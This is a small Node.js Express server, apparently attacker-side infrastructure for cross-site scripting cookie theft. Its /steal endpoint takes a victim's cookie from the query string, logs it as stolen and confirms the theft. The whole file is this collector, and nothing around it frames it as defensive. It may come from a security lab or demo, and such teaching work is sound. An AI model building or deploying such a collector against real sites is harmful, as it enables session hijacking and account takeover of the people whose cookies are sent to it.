const express = require("express");
const cors = require("cors");
const app = express();
const port = 3001;

app.use(cors());

app.get("/steal", (req, res) => {
  const cookie = req.query.cookie;
  console.log("Stolen cookie:", cookie);
  res.send("Cookie stolen!");
});

app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
